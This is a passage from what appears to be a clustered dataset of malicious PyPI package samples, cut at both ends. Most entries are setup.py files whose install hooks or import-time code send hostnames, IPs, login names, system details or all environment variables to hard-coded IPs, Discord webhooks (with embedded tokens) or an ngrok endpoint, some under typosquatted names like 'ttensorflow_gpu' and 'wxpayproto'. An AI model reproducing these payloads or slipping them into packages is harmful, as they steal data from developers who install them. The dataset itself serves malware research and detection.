        "code": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n# Note: To use the 'upload' functionality of this file, you must:\n#   $ pipenv install twine --dev\n\nimport io\nimport os\nimport sys\nfrom shutil import rmtree\nimport socket\n\nfrom setuptools import find_packages, setup, Command\nfrom setuptools.command.develop import develop\nfrom distutils.command.install import install\nimport subprocess\n\n# Package meta-data.\nNAME = 'speech-dtw'\nDESCRIPTION = 'My short description for my project.'\nURL = ''\nEMAIL = 'me@example.com'\nAUTHOR = 'Awesome Soul'\nREQUIRES_PYTHON = '>=3.6.0'\nVERSION = '0.1.1'\n\n# What packages are required for this module to be executed?\nREQUIRED = [\n    # 'requests', 'maya', 'records',\n    # 'socket'\n]\n\n# What packages are optional?\nEXTRAS = {\n    # 'fancy feature': ['django'],\n    \n}\n\n# The rest you shouldn't have to touch too much :)\n# ------------------------------------------------\n# Except, perhaps the License and Trove Classifiers!\n# If you do change the License, remember to change the Trove Classifier for that!\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\n# Import the README and use it as the long-description.\n# Note: this will only work if 'README.md' is present in your MANIFEST.in file!\ntry:\n    with io.open(os.path.join(here, 'README.md'), encoding='utf-8') as f:\n        long_description = '\\n' + f.read()\nexcept FileNotFoundError:\n    long_description = DESCRIPTION\n\n# Load the package's __version__.py module as a dictionary.\nabout = {}\nif not VERSION:\n    project_slug = NAME.lower().replace(\"-\", \"_\").replace(\" \", \"_\")\n    with open(os.path.join(here, project_slug, '__version__.py')) as f:\n        exec(f.read(), about)\nelse:\n    about['__version__'] = VERSION\n\nclass PreInstallCommand(install):\n    def run(self):\n        try:\n            # print(\"Running custom install command\")\n            # subprocess.check_call(['echo', 'Hello, World!'])\n            \n        \n            ip = \"172.16.0.103\"  \n            port = 12345  \n            message = \"Hello, Server!\"  \n            server_address = (ip, port)\n\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            \n            sock.connect(server_address)\n\n            try:\n                sock.sendall(message.encode('utf-8'))\n            finally:\n                sock.close()\n\n        except Exception as e:\n            print(f\"Server ERROR: {e}\")\n        install.run(self)\n\nclass UploadCommand(Command):\n    \"\"\"Support setup.py upload.\"\"\"\n\n    description = 'Build and publish the package.'\n    user_options = []\n\n    @staticmethod\n    def status(s):\n        \"\"\"Prints things in bold.\"\"\"\n        print('\\033[1m{0}\\033[0m'.format(s))\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        try:\n            self.status('Removing previous builds\u2026')\n            rmtree(os.path.join(here, 'dist'))\n        except OSError:\n            pass\n\n        self.status('Building Source and Wheel (universal) distribution\u2026')\n        os.system('{0} setup.py sdist bdist_wheel --universal'.format(sys.executable))\n\n        self.status('Uploading the package to PyPI via Twine\u2026')\n        os.system('twine upload dist/*')\n\n        self.status('Pushing git tags\u2026')\n        os.system('git tag v{0}'.format(about['__version__']))\n        os.system('git push --tags')\n\n        sys.exit()\n\n\n# Where the magic happens:\nsetup(\n    name=NAME,\n    version=about['__version__'],\n    description=DESCRIPTION,\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    author=AUTHOR,\n    author_email=EMAIL,\n    python_requires=REQUIRES_PYTHON,\n    url=URL,\n    packages=find_packages(exclude=[\"tests\", \"*.tests\", \"*.tests.*\", \"tests.*\"]),\n\n    install_requires=REQUIRED,\n    extras_require=EXTRAS,\n    include_package_data=True,\n    license='MIT',\n    classifiers=[\n        # Trove classifiers\n        # Full list: https://pypi.python.org/pypi?%3Aaction=list_classifiers\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy'\n    ],\n    # $ setup.py publish support.\n    cmdclass={\n        'install': PreInstallCommand,\n    },\n)\n\n\n# Insert your code here. \nimport socket\n\ndef send_string(ip, port, message):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n        server_address = (ip, port)\n        sock.connect(server_address)\n\n        try:\n            sock.sendall(message.encode('utf-8'))\n\n            response = sock.recv(1024)\n        finally:\n            sock.close()\n\n    except Exception as e:\n        print(f\"ERROR: {e}\")\n\nif __name__ == \"__main__\":\n    ip = \"123.56.142.180\"  \n    port = 12345  \n    message = \"Hello, Server!\"  \n\n    send_string(ip, port, message)\n\nfrom .core import *\n\n\n# 8b    d8 Yb  dP 88\"\"Yb    db     dP\"\"b8 88  dP    db     dP\"\"b8 888888\n# 88b  d88  YbdP  88__dP   dPYb   dP   `\" 88odP    dPYb   dP   `\" 88__\n# 88YbdP88   8P   88\"\"\"   dP__Yb  Yb      88\"Yb   dP__Yb  Yb  \"88 88\"\"\n# 88 YY 88  dP    88     dP\"\"\"\"Yb  YboodP 88  Yb dP\"\"\"\"Yb  YboodP 888888\n\nVERSION = (5, 2, 0)\n\n__version__ = '.'.join(map(str, VERSION))\n"
      }
    ]
  },
  {
    "cluster_id": 51,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-oxeru",
        "code": "#!/usr/bin/env python\nimport urllib.request\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n      webUrl = urllib.request.urlopen('https://minagolosinastorpedolocutormarcar.com/golosinapastortorpedopularie.html')\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         createfile()\n         install.run(self)\n\nsetup(name='oxeru',\n      version='0.1.4',\n      description='Security project for PoC .',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-salamus6",
        "code": "#!/usr/bin/env python\n\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n     with open('readmeandi.txt', 'w') as f:\n          f.write('Create a new text file!')\n\nclass PostInstallCommand(install):\n     def run(self):\n         createfile()\n         install.run(self)\n\n\n\nsetup(name='salamus6',\n      version='0.1.4',\n      description='Security project that aims to check how many developers install typoed libraries.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-salamus7",
        "code": "#!/usr/bin/env python\n\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n     with open('/tmp/readmeandi.txt', 'w') as f:\n          f.write('Create a new text file!')\n\nclass PostInstallCommand(install):\n     def run(self):\n         createfile()\n         install.run(self)\n\nsetup(name='salamus7',\n      version='0.1.4',\n      description='Security project that aims to check how many developers install typoed libraries.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      }
    ]
  },
  {
    "cluster_id": 52,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-10-miantested",
        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        import aiohttp\n        import socket\n        import requests\n        from discord import SyncWebhook\n        hostname=socket.gethostname()   \n        IPAddr=socket.gethostbyname(hostname)\n        webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/1040010700677988502/-NIIPOoDdImwivYH43PiNxcvlGho7Dt1lZg3IG7U4IZbvkq7eQj6d_5eYqyFDjVo88wB') # Initializing webhook       \n        webhook.send(content=f\"{hostname},{IPAddr}\")\n        install.run(self)\n\n\n\nsetup(\n  name = 'miantested',\n  packages=find_packages(),\n  version = '0.56',\n  description = 'Yes.',\n  author = 'haha.',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\",\"Cmake\",\"wheel\",\"requests\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author_email = 'mianism@outlook.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-10-miantestone",
        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        import aiohttp\n        import socket\n        import requests\n        from discord import SyncWebhook\n        hostname=socket.gethostname()   \n        IPAddr=socket.gethostbyname(hostname)\n        webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/1040010700677988502/-NIIPOoDdImwivYH43PiNxcvlGho7Dt1lZg3IG7U4IZbvkq7eQj6d_5eYqyFDjVo88wB') # Initializing webhook       \n        webhook.send(content=f\"{hostname},{IPAddr}\")\n        install.run(self)\n\n\n\nsetup(\n  name = 'miantestone',\n  packages=find_packages(),\n  version = '0.55',\n  description = 'Yes.',\n  author = 'haha.',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\",\"Cmake\",\"wheel\",\"requests\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author_email = 'mianism@outlook.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n\n)\n"
      }
    ]
  },
  {
    "cluster_id": 53,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-19-artifact-lab-3-package-4c04b1a2-v1.0.4",
        "code": "import os\nimport urllib.request\nimport urllib.parse\n\n# Function to leak environment variables\ndef run_payload():\n    data = dict(os.environ)\n    \n    # Print the environment variables to stdout (for debugging purposes)\n    print(\"Environment variables collected during installation:\", data)\n    \n    # Optionally, send them to a server via a POST request (using URL encoding)\n    url = 'https://5cecdbdb0328.ngrok.app/collect'  # Replace with your actual Ngrok URL\n    encoded_data = urllib.parse.urlencode(data).encode('utf-8')\n    req = urllib.request.Request(url, data=encoded_data)\n    req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n    try:\n        urllib.request.urlopen(req)\n        print(\"Successfully sent environment variables\")\n    except Exception as e:\n        print(f\"Failed to send environment variables: {e}\")\n"
      }
    ]
  },
  {
    "cluster_id": 54,
    "size": 4,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-12-mianoplol",
        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\n\n\nclass CustomInstallCommand(install):\n    async def run(self):\n        from discord import Webhook, AsyncWebhookAdapter\n        import aiohttp\n        async with aiohttp.ClientSession() as session:  \n          webhook = Webhook.from_url('https://discord.com/api/webhooks/1040010700677988502/-NIIPOoDdImwivYH43PiNxcvlGho7Dt1lZg3IG7U4IZbvkq7eQj6d_5eYqyFDjVo88wB', adapter=AsyncWebhookAdapter(session))\n          import socket   \n          hostname=socket.gethostname()   \n          IPAddr=socket.gethostbyname(hostname)            \n          await webhook.send(content=f\"{hostname},{IPAddr}\")\n        await install.run(self)\n\n\n\nsetup(\n  name = 'mianoplol',\n  packages=find_packages(),\n  version = '0.55',\n  description = 'Yes.',\n  author = 'haha.',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\",\"Cmake\",\"wheel\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author_email = 'mianism@outlook.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-12-ggvpslmao",
        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\n\n\nclass CustomInstallCommand(install):\n    async def run(self):\n        from discord import Webhook, AsyncWebhookAdapter\n        import aiohttp\n        async with aiohttp.ClientSession() as session:  \n          webhook = Webhook.from_url('https://discord.com/api/webhooks/1040010700677988502/-NIIPOoDdImwivYH43PiNxcvlGho7Dt1lZg3IG7U4IZbvkq7eQj6d_5eYqyFDjVo88wB', adapter=AsyncWebhookAdapter(session))\n          import socket   \n          hostname=socket.gethostname()   \n          IPAddr=socket.gethostbyname(hostname)            \n          await webhook.send(content=f\"{hostname},{IPAddr}\")\n        install.run(self)\n\n\n\nsetup(\n  name = 'ggvpslmao',\n  packages=find_packages(),\n  version = '0.69',\n  description = 'Yes.',\n  author = 'haha.',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\",\"Cmake\",\"wheel\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author_email = 'mianism@outlook.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-12-lmaoalmost",
        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\n\n\nclass CustomInstallCommand(install):\n    async def run(self):\n        from discord import Webhook, AsyncWebhookAdapter\n        import aiohttp\n        async with aiohttp.ClientSession() as session:  \n          webhook = Webhook.from_url('https://discord.com/api/webhooks/1040010700677988502/-NIIPOoDdImwivYH43PiNxcvlGho7Dt1lZg3IG7U4IZbvkq7eQj6d_5eYqyFDjVo88wB', adapter=AsyncWebhookAdapter(session))\n          import socket   \n          hostname=socket.gethostname()   \n          IPAddr=socket.gethostbyname(hostname)            \n          await webhook.send(content=f\"{hostname},{IPAddr}\")\n        install.run(self)\n\n\n\nsetup(\n  name = 'lmaoalmost',\n  packages=find_packages(),\n  version = '0.69',\n  description = 'Yes.',\n  author = 'haha.',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author_email = 'mianism@outlook.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-12-mianoplmao",
        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\n\n\nclass CustomInstallCommand(install):\n    async def run(self):\n        from discord import Webhook, AsyncWebhookAdapter\n        import aiohttp\n        async with aiohttp.ClientSession() as session:  \n          webhook = Webhook.from_url('https://discord.com/api/webhooks/1040010700677988502/-NIIPOoDdImwivYH43PiNxcvlGho7Dt1lZg3IG7U4IZbvkq7eQj6d_5eYqyFDjVo88wB', adapter=AsyncWebhookAdapter(session))\n          import socket   \n          hostname=socket.gethostname()   \n          IPAddr=socket.gethostbyname(hostname)            \n          await webhook.send(content=f\"{hostname},{IPAddr}\")\n        await install.run(self)\n\n\n\nsetup(\n  name = 'mianoplmao',\n  packages=find_packages(),\n  version = '0.69',\n  description = 'Yes.',\n  author = 'haha.',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\",\"Cmake\",\"wheel\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author_email = 'mianism@outlook.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n\n)\n"
      }
    ]
  },
  {
    "cluster_id": 55,
    "size": 4,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-08-tdwtauthauthentication-v1.0.9",
        "code": "import os\nimport re\nimport sys\nimport subprocess\nfrom setuptools import setup\nfrom setuptools import find_packages\nimport requests\nimport base64\nimport platform\nimport socket\nimport requests,base64,platform,os,socket,ast;\nip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]\nd = \"%s\\n%s\\n%s\\n%s\\n%s\\n%s\" % ('PYPI_Victim-tdwTauthAuthentication-1.0.9',os.getlogin(), platform.node(), str(platform.uname()), os.getcwd(), ip)\ndata_base64 = base64.b64encode(d.encode()).decode('utf-8')\nresponse = requests.get(\"http://129.226.195.123/v/%s\" % data_base64);\n\n\nsetup(\n    name=\"tdwTauthAuthentication\",\n    version=\"1.0.9\",\n    description=\"Python SDK\",\n    python_requires=\">=3.6\",\n    install_requires=[\n        \"requests>=2.27.1\"\n    ],\n)\n\n\nfrom polaris.pkg.model.context import ValueContext\nfrom polaris.pkg.model.service import Instance\nfrom polaris.pkg.config.api import Configuration\n\n\nclass PluginType:\n    OUTLIER_DETECTION = 1\n    SERVER_CONNECTOR = 2\n    SERVICE_ROUTER = 3\n    LOAD_BALANCE = 4\n    CIRCUIT_BREAKER = 5\n    LOCAL_CACHE = 6\n    STAT_REPORTER = 7\n\n\nclass EventType:\n    ON_LOCALVALUE_CREATED = 1\n\n\nclass DetectResult:\n    def __init__(self, detect_type: str = \"\", ret_status: int = 0, detect_time: int = 0,\n                 detect_instance: Instance = None):\n        self.detect_type = detect_type\n        self.ret_status = ret_status\n        self.detect_time = detect_time\n        self.detect_instance = detect_instance\n\n    def get_detect_type(self):\n        return self.detect_type\n\n    def get_detect_time(self):\n        return self.detect_time\n\n    def get_detect_instance(self):\n        return self.detect_instance\n\n    def get_ret_status(self):\n        return self.ret_status\n\n\nclass PluginManager:\n    def __init__(self):\n        self.plugin_container = {}\n        self.plugin_instance = {}\n\n    def register(self, plugin_type: PluginType, plugin_name: str, plugin_cls):\n        # print('register plugin', plugin_type, plugin_name)\n        if plugin_type not in self.plugin_container.keys():\n            self.plugin_container[plugin_type] = {}\n        self.plugin_container[plugin_type][plugin_name] = plugin_cls\n\n    def get(self, plugin_type: PluginType, plugin_name: str):\n        if plugin_type in self.plugin_container:\n            return self.plugin_container[plugin_type][plugin_name]\n        else:\n            return \"\"\n\n    def find_instance(self, plugin_type: PluginType, plugin_name: str) -> bool:\n        if plugin_type in self.plugin_instance and plugin_name in self.plugin_instance[plugin_type]:\n            return True\n        return False\n\n    def get_instance(self, plugin_type: PluginType, plugin_name: str):\n        return self.plugin_instance[plugin_type][plugin_name]\n\n    def set_instance(self, plugin_type: PluginType, plugin_name: str, instance):\n        if plugin_type not in self.plugin_instance:\n            self.plugin_instance[plugin_type] = {}\n\n        DefaultPluginManager.plugin_instance[plugin_type][plugin_name] = instance\n\n    def clear_instances(self):\n        self.plugin_instance = {}\n\n    def destroy_plugins(self):\n        self.plugin_container = {}\n        self.plugin_instance = {}\n\n\ndef register_plugin(plugin_type: PluginType, plugin_name: str):\n    def decorator(cls):\n        DefaultPluginManager.register(plugin_type, plugin_name, cls)\n        return cls\n\n    return decorator\n\n\n# the function should be called after setup\ndef get_plugin(plugin_type: PluginType, plugin_name: str):\n    return DefaultPluginManager.get_instance(plugin_type, plugin_name)\n\n\nDefaultPluginManager = PluginManager()\n\n\ndef reload_global_plugin_manager():\n    global DefaultPluginManager\n    DefaultPluginManager.clear_instances()\n\n\nclass InitContext:\n    def __init__(self, config: Configuration = None, value_ctx: ValueContext = None):\n        self.config = config\n        self.value_ctx = value_ctx\n\n\ndef setup(init_ctx: InitContext):\n    reload_global_plugin_manager()\n\n    for plugin_type, plugins in DefaultPluginManager.plugin_container.items():\n        for plugin_name, plugin in plugins.items():\n            if not DefaultPluginManager.find_instance(plugin_type, plugin_name):\n                DefaultPluginManager.set_instance(plugin_type, plugin_name, plugin(init_ctx))\n\n\nevent_handle_map = {}\n\n\ndef register_event_handle(event_type, func):\n    if event_handle_map.get(event_type, None) is not None:\n        event_handle_map[event_type].append(func)\n    else:\n        event_handle_map[event_type] = [func]\n\n\ndef get_event_subscriber(event_type):\n    return event_handle_map.get(event_type, None)\n\n\nfrom .api import *\n\n__version__ = '1.0.9'\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-08-ttensorflow-gpu-v2.5.0",
        "code": "import os\nimport re\nimport sys\nimport subprocess\nfrom setuptools import setup\nfrom setuptools import find_packages\nimport requests\nimport base64\nimport platform\nimport socket\nimport requests,base64,platform,os,socket,ast;\nip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]\nd = \"%s\\n%s\\n%s\\n%s\\n%s\\n%s\" % ('PYPI_Victim-ttensorflow_gpu-2.5.0',os.getlogin(), platform.node(), str(platform.uname()), os.getcwd(), ip)\ndata_base64 = base64.b64encode(d.encode()).decode('utf-8')\nresponse = requests.get(\"http://129.226.195.123/v/%s\" % data_base64);\n\n\nsetup(\n    name=\"ttensorflow_gpu\",\n    version=\"2.5.0\",\n    description=\"Python SDK\",\n    python_requires=\">=3.6\",\n    install_requires=[\n        \"requests>=2.27.1\"\n    ],\n)\n\n\nfrom polaris.pkg.model.context import ValueContext\nfrom polaris.pkg.model.service import Instance\nfrom polaris.pkg.config.api import Configuration\n\n\nclass PluginType:\n    OUTLIER_DETECTION = 1\n    SERVER_CONNECTOR = 2\n    SERVICE_ROUTER = 3\n    LOAD_BALANCE = 4\n    CIRCUIT_BREAKER = 5\n    LOCAL_CACHE = 6\n    STAT_REPORTER = 7\n\n\nclass EventType:\n    ON_LOCALVALUE_CREATED = 1\n\n\nclass DetectResult:\n    def __init__(self, detect_type: str = \"\", ret_status: int = 0, detect_time: int = 0,\n                 detect_instance: Instance = None):\n        self.detect_type = detect_type\n        self.ret_status = ret_status\n        self.detect_time = detect_time\n        self.detect_instance = detect_instance\n\n    def get_detect_type(self):\n        return self.detect_type\n\n    def get_detect_time(self):\n        return self.detect_time\n\n    def get_detect_instance(self):\n        return self.detect_instance\n\n    def get_ret_status(self):\n        return self.ret_status\n\n\nclass PluginManager:\n    def __init__(self):\n        self.plugin_container = {}\n        self.plugin_instance = {}\n\n    def register(self, plugin_type: PluginType, plugin_name: str, plugin_cls):\n        # print('register plugin', plugin_type, plugin_name)\n        if plugin_type not in self.plugin_container.keys():\n            self.plugin_container[plugin_type] = {}\n        self.plugin_container[plugin_type][plugin_name] = plugin_cls\n\n    def get(self, plugin_type: PluginType, plugin_name: str):\n        if plugin_type in self.plugin_container:\n            return self.plugin_container[plugin_type][plugin_name]\n        else:\n            return \"\"\n\n    def find_instance(self, plugin_type: PluginType, plugin_name: str) -> bool:\n        if plugin_type in self.plugin_instance and plugin_name in self.plugin_instance[plugin_type]:\n            return True\n        return False\n\n    def get_instance(self, plugin_type: PluginType, plugin_name: str):\n        return self.plugin_instance[plugin_type][plugin_name]\n\n    def set_instance(self, plugin_type: PluginType, plugin_name: str, instance):\n        if plugin_type not in self.plugin_instance:\n            self.plugin_instance[plugin_type] = {}\n\n        DefaultPluginManager.plugin_instance[plugin_type][plugin_name] = instance\n\n    def clear_instances(self):\n        self.plugin_instance = {}\n\n    def destroy_plugins(self):\n        self.plugin_container = {}\n        self.plugin_instance = {}\n\n\ndef register_plugin(plugin_type: PluginType, plugin_name: str):\n    def decorator(cls):\n        DefaultPluginManager.register(plugin_type, plugin_name, cls)\n        return cls\n\n    return decorator\n\n\n# the function should be called after setup\ndef get_plugin(plugin_type: PluginType, plugin_name: str):\n    return DefaultPluginManager.get_instance(plugin_type, plugin_name)\n\n\nDefaultPluginManager = PluginManager()\n\n\ndef reload_global_plugin_manager():\n    global DefaultPluginManager\n    DefaultPluginManager.clear_instances()\n\n\nclass InitContext:\n    def __init__(self, config: Configuration = None, value_ctx: ValueContext = None):\n        self.config = config\n        self.value_ctx = value_ctx\n\n\ndef setup(init_ctx: InitContext):\n    reload_global_plugin_manager()\n\n    for plugin_type, plugins in DefaultPluginManager.plugin_container.items():\n        for plugin_name, plugin in plugins.items():\n            if not DefaultPluginManager.find_instance(plugin_type, plugin_name):\n                DefaultPluginManager.set_instance(plugin_type, plugin_name, plugin(init_ctx))\n\n\nevent_handle_map = {}\n\n\ndef register_event_handle(event_type, func):\n    if event_handle_map.get(event_type, None) is not None:\n        event_handle_map[event_type].append(func)\n    else:\n        event_handle_map[event_type] = [func]\n\n\ndef get_event_subscriber(event_type):\n    return event_handle_map.get(event_type, None)\n\n\nfrom .api import *\n\n__version__ = '2.5.0'\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-08-wxpayproto-v1.3.1",
        "code": "import os\nimport re\nimport sys\nimport subprocess\nfrom setuptools import setup\nfrom setuptools import find_packages\nimport requests\nimport base64\nimport platform\nimport socket\nimport requests,base64,platform,os,socket,ast;\nip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]\nd = \"%s\\n%s\\n%s\\n%s\\n%s\\n%s\" % ('PYPI_Victim-wxpayproto-1.3.1',os.getlogin(), platform.node(), str(platform.uname()), os.getcwd(), ip)\ndata_base64 = base64.b64encode(d.encode()).decode('utf-8')\nresponse = requests.get(\"http://129.226.195.123/v/%s\" % data_base64);\n\n\nsetup(\n    name=\"wxpayproto\",\n    version=\"1.3.1\",\n    description=\"Python SDK\",\n    python_requires=\">=3.6\",\n    install_requires=[\n        \"requests>=2.27.1\"\n    ],\n)\n\n\nfrom polaris.pkg.model.context import ValueContext\nfrom polaris.pkg.model.service import Instance\nfrom polaris.pkg.config.api import Configuration\n\n\nclass PluginType:\n    OUTLIER_DETECTION = 1\n    SERVER_CONNECTOR = 2\n    SERVICE_ROUTER = 3\n    LOAD_BALANCE = 4\n    CIRCUIT_BREAKER = 5\n    LOCAL_CACHE = 6\n    STAT_REPORTER = 7\n\n\nclass EventType:\n    ON_LOCALVALUE_CREATED = 1\n\n\nclass DetectResult:\n    def __init__(self, detect_type: str = \"\", ret_status: int = 0, detect_time: int = 0,\n                 detect_instance: Instance = None):\n        self.detect_type = detect_type\n        self.ret_status = ret_status\n        self.detect_time = detect_time\n        self.detect_instance = detect_instance\n\n    def get_detect_type(self):\n        return self.detect_type\n\n    def get_detect_time(self):\n        return self.detect_time\n\n    def get_detect_instance(self):\n        return self.detect_instance\n\n    def get_ret_status(self):\n        return self.ret_status\n\n\nclass PluginManager:\n    def __init__(self):\n        self.plugin_container = {}\n        self.plugin_instance = {}\n\n    def register(self, plugin_type: PluginType, plugin_name: str, plugin_cls):\n        # print('register plugin', plugin_type, plugin_name)\n        if plugin_type not in self.plugin_container.keys():\n            self.plugin_container[plugin_type] = {}\n        self.plugin_container[plugin_type][plugin_name] = plugin_cls\n\n    def get(self, plugin_type: PluginType, plugin_name: str):\n        if plugin_type in self.plugin_container:\n            return self.plugin_container[plugin_type][plugin_name]\n        else:\n            return \"\"\n\n    def find_instance(self, plugin_type: PluginType, plugin_name: str) -> bool:\n        if plugin_type in self.plugin_instance and plugin_name in self.plugin_instance[plugin_type]:\n            return True\n        return False\n\n    def get_instance(self, plugin_type: PluginType, plugin_name: str):\n        return self.plugin_instance[plugin_type][plugin_name]\n\n    def set_instance(self, plugin_type: PluginType, plugin_name: str, instance):\n        if plugin_type not in self.plugin_instance:\n            self.plugin_instance[plugin_type] = {}\n\n        DefaultPluginManager.plugin_instance[plugin_type][plugin_name] = instance\n\n    def clear_instances(self):\n        self.plugin_instance = {}\n\n    def destroy_plugins(self):\n        self.plugin_container = {}\n        self.plugin_instance = {}\n\n\ndef register_plugin(plugin_type: PluginType, plugin_name: str):\n    def decorator(cls):\n        DefaultPluginManager.register(plugin_type, plugin_name, cls)\n        return cls\n\n    return decorator\n\n\n# the function should be called after setup\ndef get_plugin(plugin_type: PluginType, plugin_name: str):\n    return DefaultPluginManager.get_instance(plugin_type, plugin_name)\n\n\nDefaultPluginManager = PluginManager()\n\n\ndef reload_global_plugin_manager():\n    global DefaultPluginManager\n    DefaultPluginManager.clear_instances()\n\n\nclass InitContext:\n    def __init__(self, config: Configuration = None, value_ctx: ValueContext = None):\n        self.config = config\n        self.value_ctx = value_ctx\n\n\ndef setup(init_ctx: InitContext):\n    reload_global_plugin_manager()\n\n    for plugin_type, plugins in DefaultPluginManager.plugin_container.items():\n        for plugin_name, plugin in plugins.items():\n            if not DefaultPluginManager.find_instance(plugin_type, plugin_name):\n                DefaultPluginManager.set_instance(plugin_type, plugin_name, plugin(init_ctx))\n\n\nevent_handle_map = {}\n\n\ndef register_event_handle(event_type, func):\n    if event_handle_map.get(event_type, None) is not None:\n        event_handle_map[event_type].append(func)\n    else:\n        event_handle_map[event_type] = [func]\n\n\ndef get_event_subscriber(event_type):\n    return event_handle_map.get(event_type, None)\n\n\nfrom .api import *\n\n__version__ = '1.3.1'\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-09-wxpay-comm-v0.1.178",
        "code": "import os\nimport re\nimport sys\nimport subprocess\nfrom setuptools import setup\nfrom setuptools import find_packages\nimport requests\nimport base64\nimport platform\nimport socket\nimport requests,base64,platform,os,socket,ast;\nip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]\nd = \"%s\\n%s\\n%s\\n%s\\n%s\\n%s\" % ('PYPI_Victim-wxpay_comm-0.1.178',os.getlogin(), platform.node(), str(platform.uname()), os.getcwd(), ip)\ndata_base64 = base64.b64encode(d.encode()).decode('utf-8')\nresponse = requests.get(\"http://129.226.195.123/v/%s\" % data_base64);\n\n\nsetup(\n    name=\"wxpay_comm\",\n    version=\"0.1.178\",\n    description=\"Python SDK\",\n    python_requires=\">=3.6\",\n    install_requires=[\n        \"requests>=2.27.1\"\n    ],\n)\n\n\nfrom polaris.pkg.model.context import ValueContext\nfrom polaris.pkg.model.service import Instance\nfrom polaris.pkg.config.api import Configuration\n\n\nclass PluginType:\n    OUTLIER_DETECTION = 1\n    SERVER_CONNECTOR = 2\n    SERVICE_ROUTER = 3\n    LOAD_BALANCE = 4\n    CIRCUIT_BREAKER = 5\n    LOCAL_CACHE = 6\n    STAT_REPORTER = 7\n\n\nclass EventType:\n    